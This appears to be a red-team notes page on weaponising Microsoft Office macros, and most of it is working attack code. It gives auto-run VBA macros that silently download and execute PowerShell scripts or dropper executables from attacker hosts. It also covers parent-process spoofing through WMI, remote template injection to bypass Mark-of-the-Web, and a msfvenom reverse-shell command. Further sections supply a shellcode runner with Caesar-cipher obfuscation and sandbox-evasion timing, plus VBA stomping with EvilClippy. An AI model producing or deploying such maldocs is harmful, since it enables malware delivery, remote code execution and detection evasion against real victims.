---
title: Microsoft Office Macros
---

# Visual Basic for Applications (VBA) Macro

VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. 

VBA is not all that different from VBScript, so it's not too difficult to use the `wscript.shell object`.


> **Note**: The file must be saved in `.doc` format due inside `.docx` files cannot save macros.

To create a macro go to `View -> Macros` and create one.

![Macro](../images/macro-create.png)

> **Note**: It's important to select the document in order to save the macro inside.

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

![Macro](../images/macro-calc.png)

> **Note**: To force the macro to trigger automatically when the document is opened, use the name`AutoOpen()`.

## Executing a Powershell Payload

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a.ps1'))"""

End Sub
```

```vb
Sub MyMacro()
    Dim str As String
    str = "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/a.ps1')"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Enumeration with Environ function

```vb
Sub Enum()

    Dim username
    Dim hostname
    
    username = Environ("username")
    hostname = Environ("computername")
    MsgBox username + "||" + hostname

End Sub
```




# Changing Prent-Child Relationship

When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.

With `wmi` we can create another parent process and append the powershell to wmi and not to the MS Word.


```VB
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```


> **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.


## Remote Template Injection


Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script.

* Create a word add a macro and save it as `Word 97-2003 Template (.dot)`. This will be out malicious remote template, and we can also host this file.
* Next, create a new document from the blank template located in `C:\Users\User\Documents\Custom Office Templates`. Add any content and save it as `.docx`.
* Browse to the directory in explorer, right-click and select `7-zip -> Open Archive`. Navigate to `word -> _rels`, right-click on `settings.xml.rels` and select Edit. Change the Target entry and specify out hosted template.

```
Target="http://10.10.10.10/template.dot"
```
This will allow to execute the macro even if its flagged with MOTW.


# Downloading and executing a file

There are different ways to execute a binary.

```vb
Sub Document_Open()
  BenJugat
End Sub

Sub Autopen()
  BenJugat
End Sub

Sub BenJugat()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.tld/dropper.exe', '" + ActiveDocument.Path + "\dropper.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = ActiveDocument.Path + "\dropper.exe"
  Wait (2)
  Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s",n,t)
End Sub
```

```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell Invoke-WebRequest -uri 'http://evil.tld/dropper.exe' -outfile 'c:\users\benjugat\downloads\dropper.exe'"
    Shell str, vbHide
    Dim exePath As String
    exePath = "c:\users\benjugat\downloads\dropper.exe"
    Wait (10)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

# Reflective Powershell

We can use `IEX` in powershell to download a `.ps1` and execute it without touching disk. Use a powershell loader with reflection in order to avoid be detected.

```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://evil.tld/dropper.ps1') | IEX"
    Shell str, vbHide

End Sub
```

Visit [Powershell reflected shellcode runner](https://benjugat.github.io/rtnotes/malware/basics/powershell-dropper/#wrapping-to-powershell) to obtain an example of `dropper.ps1` file.

# Usage of WinAPIs in vba

It's important to declare first the WINAPI on the beggining of the vba.

```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function
```

Another example:

```vb
Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "kernel32.dll" (ByRef TotalMemoryInKilobytes As Long) As Long

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
  Dim res As Long
  Dim TotalMemoryInKilobytes As Long
  
  res = GetPhysicallyInstalledSystemMemory(TotalMemoryInKilobytes)

  MsgBox (TotalMemoryInKilobytes)
End Function
```

## VBA shellocde Runner

First we need to generate our payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
```

And our vba should be something like that:

```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
  
    buf = Array(252, 72, 131, 229.....)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    

End Function
```

### Some Evasion for Word

Added Caesar cipher and some evasion for heuristics.

* Caesar python script:

```py

import argparse

def caesar_encrypt(data, rotation=2):
    return bytes((byte + rotation) % 256 for byte in data)

def format_vba_array(data, max_line_length=240):
    lines = []
    current = "buf = Array("

    for byte in data:
        value = str(byte)

        separator = "" if current.endswith("(") else ", "
        addition = separator + value

        if len(current) + len(addition) + 2 > max_line_length:
            lines.append(current + ", _")
            current = "    " + value
        else:
            current += addition

    lines.append(current + ")")

    if len(lines) > 25:
        raise ValueError(
            f"Se necesitan {len(lines) - 1} continuaciones. "
            "VBA permite un máximo de 24."
        )

    return "\n".join(lines)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("file")
    parser.add_argument("-r", "--rotation", type=int, default=2)
    args = parser.parse_args()

    with open(args.file, "rb") as f:
        data = f.read()

    encrypted = caesar_encrypt(data, args.rotation)

    print(format_vba_array(encrypted))

if __name__ == "__main__":
    main()
```

```vb
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2500)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    buf = Array(252, 72, 131, 229.....)
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function
```

## VBA Stomping

VBA stomping is a malware obfuscation technique used to hide malicious code inside Microsoft office documents.

When a Word contains a macro, it actually stores that macro in two different places inside the file structure:

* **VBA Source Code**: The human-readable script written by the autor.
* **Compile P-code**: The machine-readable bytecode that MS Word actually executes when the file is opened.

To perform VBA stomping, an attacker creates a malicious macro and lets Office compile it into executable p-code. They then delete or overwrite the human-readable VBA source code with harmless text or blank data while leaving the malicious p-code intact.

To automate this technique we can use `Evil Clippy`.

* [https://www.outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/](https://www.outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)

```
> .\EvilClippy.exe
Usage: eviloffice.exe [OPTIONS]+ filename

Author: Stan Hegt
Email: stan@outflank.nl

Options:
  -n, --name=VALUE           The target module name to stomp.
                               This argument can be repeated.
  -s, --sourcefile=VALUE     File containing substitution VBA code (fake
                               code).
  -g, --guihide              Hide code from VBA editor GUI.
  -t, --targetversion=VALUE  Target MS Office version the pcode will run on.
  -w, --webserver=VALUE      Start web server on specified port to serve
                               malicious template.
  -d, --delmetadata          Remove metadata stream (may include your name
                               etc.).
  -r, --randomnames          Set random module names, confuses some analyst
                               tools.
  -u, --unviewableVBA        Make VBA Project unviewable/locked.
      --uu, --viewableVBA    Make VBA Project viewable/unlocked.
  -v                         Increase debug message verbosity.
  -h, --help                 Show this message and exit.
```

```
.\EvilClippy.exe -g -r benjugat.doc
```